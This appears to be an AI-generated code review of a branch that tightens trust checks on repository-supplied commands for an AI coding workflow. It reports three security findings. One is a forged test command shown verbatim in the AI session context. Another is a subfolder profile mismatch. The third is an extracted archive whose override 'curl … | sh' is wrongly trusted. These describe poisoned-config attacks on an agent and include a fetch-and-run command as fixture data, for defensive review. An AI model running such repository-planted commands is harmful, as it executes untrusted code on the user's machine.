## Argus review

Resolver, monotonic merge, trust store and effective commands meet AC-1–9, AC-11 and AC-13, and `config commands` refuses every malicious fixture; but the session banner still prints a forged `script` command (AC-12), so `test-trust.sh` and CI fail. Not reviewed line by line: README.md, ARCHITECTURE.md, test bodies; test-detector.sh not run (AC-10); no stack pack: bash.

**Done well:** `_resolve_security_value` in `.claude/scripts/lib/wfconfig.py` applies the PF-5 anchor rule with one `_combine` per operator and records every refused value in `ignored[]`. `U-policy-monotonic-01…06` and `PT-policy-ops-01…09` prove each R-AC-44 case: 77 config tests pass, and resolve p95 is 9.2 ms.

**1. [important · security] Session banner still shows a forged `script` command as the project's test command; test-trust.sh and CI fail**
In fast mode, `needs_trust` skips `script`/`derived` entries unless the store is unusable. Take a committed profile whose `script` `test` was swapped for `touch CANARY`, with a fresh `manifest_hash` so `--ensure` keeps it. That command appears verbatim in every session's context, with no `(untrusted)` and no count. `U-trust-banner-02` (PT-trust-profile-02) fails on exactly this.
- Fix: Give fast mode something to check against. Have `trust record --pending` also store the digests of the `script`/`derived` entries that re-detection reproduced. Then have `needs_trust` treat any such entry missing from the store as untrusted, which is what §3.8's "unverified" says. Regression test: `U-trust-banner-02`, which is already written and failing.
- Where: `.claude/hooks/session-init.sh:84-94`; `scripts/test-trust.sh:1077-1096`
- Cost: A repo with script commands shows one banner line until `/setup` runs once, and again after a manifest change alters a script command. The store also holds detected digests.
<!-- argus-finding:1ef278f-1 -->

**2. [consider · security] Sessions started in a git subfolder: banner shows every command unfiltered and `config commands` finds none**
The hook's detector writes `<CLAUDE_PROJECT_DIR>/.workflow/profile.json`, but `count_untrusted` and `config commands` load the git top's profile (`resolved.repo`). Reproduced on a temp repo: opened in `mono/web`, a forged `user` `test` there prints verbatim with no trust line, and `config commands --repo mono/web` says `no commands`, so every check needs asking.
- Fix: Run the hook's detector with `--root` set to `trust.top_level(project)[0]`, the folder `/setup` and `config commands` use. The summary, the count and `config commands` then read one profile. Add a banner test with `CLAUDE_PROJECT_DIR` in a subfolder. Raise to important if subfolder sessions are a supported layout: today they lose every runnable command until `/setup` writes a top-level profile.
- Where: `.claude/hooks/session-init.sh:68-69`; `.claude/hooks/session-init.sh:161-163`; `.claude/scripts/lib/wfconfig.py:1608`
- Cost: In monorepos the hook re-detects the whole repository, within its existing 4 s budget.
<!-- argus-finding:1ef278f-2 -->

**3. [consider · security] An extracted archive with a nested git repo gets TL3, so its `commands` override runs unasked**
`_workspace_level` gives TL3 to any folder above the repo top that isn't inside a work tree, and `_decide` trusts TL3 overrides as `user-config`. Reproduced: unzip `starter/` holding `.workflow/config.yml` (`test: curl … | sh`) and `app/.git`, and `config commands --repo starter/app --workspace starter` reports the override as trusted. The guide says a downloaded folder can't claim TL3.
- Fix: Require the trust store for TL3 `commands` overrides as well (update `_decide`, `_claims_trust` and `_cli_record`). Leave TL3 preferences and the tighten-only security keys as they are. Correct `trust-and-policy.md:19` and the ARCHITECTURE table. Regression test: a PT fixture with an outer non-git folder and a nested repo. Raise to important if workspaces are shared as archives.
- Where: `.claude/scripts/lib/wfconfig.py:865-879`; `.claude/scripts/lib/trust.py:746-747`; `docs/guides/trust-and-policy.md:19`
- Cost: Multi-root users confirm workspace-level command overrides once in `/setup`. The TL3 row in plan §3.8 changes.
<!-- argus-finding:1ef278f-3 -->

_Disagree with a finding? Reply on it or in a PR comment; replies are read on the next run._

_Reviewed with Claude Code (`/argus`). Findings weigh tradeoffs, not style — an empty review means nothing material was found._

<!-- argus-review:iamjcabalejo/daedalus@feat/hardening-p1a:1ef278fb64e45e66238ca8402ec88d9546c9cc2c+worktree -->

<details><summary>Run notes</summary>

- **Config:** domain `none` (caller override: the personal default domain in `~/.claude/argus.yml` targets product repos; this is the generic hub, as in prior hub reviews); tickets.system `linear` from `~/.claude/argus.yml` (TL2, resolved with `workflow.py config resolve`), not used: the plan `docs/plans/daedalus-hardening-p1a.md` is the ticket (AC-1…AC-14; AC-15 is operational QA).
- **Scope:** the uncommitted working tree on `feat/hardening-p1a` over `1ef278f`, diff built with a temporary index (`argus-bundle.sh --local` reviews HEAD only). 131 files, ~8,650 diff lines. Excluded: `plugins/**` (generated; `build-plugin.sh --check` passes), `docs/assets/**`, `.claude/hooks/audit.log`, `docs/reviews/**`, `docs/plans/argus-token-diet.md` (unrelated).
- **Test runs by the reviewer:** `test-config.sh` 77/77 pass; `test-trust.sh` 39/40 (`U-trust-banner-02` fails, finding 1). Hook warm start ≈ 0.20–0.23 s.
- **Severity mapping (project-manager):** finding 1 → Critical; findings 2 and 3 → Suggestion.

</details>

<details><summary>findings.json</summary>

```json
{"stacks": ["python", "ci-cd"],
 "uncovered": [".claude/hooks/session-init.sh", "scripts/test-all.sh", "scripts/test-config.sh", "scripts/test-trust.sh", "scripts/build-plugin.sh", "templates/workflow-config.example.yml", "overlays/_template/config.yml", "scripts/fixtures/**", ".claude/**/*.md", "README.md", "ARCHITECTURE.md", "CLAUDE.md", "docs/guides/trust-and-policy.md"],
 "domain": "none",
 "ac": {"met": 12, "not_met": 1, "not_visible": 1},
 "findings": [
  {"id": "1ef278f-1", "severity": "important", "category": "security", "family": "FM-13", "title": "Session banner still shows a forged `script` command as the project's test command; test-trust.sh and CI fail", "path": ".claude/hooks/session-init.sh", "line": 84, "new": true},
  {"id": "1ef278f-2", "severity": "consider", "category": "security", "family": "FM-10", "title": "Sessions started in a git subfolder: banner shows every command unfiltered and `config commands` finds none", "path": ".claude/hooks/session-init.sh", "line": 68, "new": true},
  {"id": "1ef278f-3", "severity": "consider", "category": "security", "family": "FM-13", "title": "An extracted archive with a nested git repo gets TL3, so its `commands` override runs unasked", "path": ".claude/scripts/lib/wfconfig.py", "line": 865, "new": true}],
 "not_reviewed": ["README.md", "ARCHITECTURE.md", "scripts/test-config.sh (run: 77 pass; not read in full)", "scripts/test-trust.sh (run: 39 pass, 1 fail; read in part)", "scripts/fixtures/**", "skill and rule prompt diffs other than setup, manual-test, project-manager, argus and implementer (covered by the U-config-consumers-01 / U-trust-consumers-01 grep tests, which pass)", "scripts/test-detector.sh (not run: it fetches public repos)"],
 "pack_suggestions": [
  {"stack": "bash", "family": "FM-10", "signal": "a session hook and a CLI derive the project folder differently (CLAUDE_PROJECT_DIR vs git rev-parse --show-toplevel), so they read different state files"},
  {"stack": "python", "family": "FM-13", "signal": "trust granted by folder position (an ancestor outside any work tree) rather than by an owner-recorded digest"}]}
```

</details>
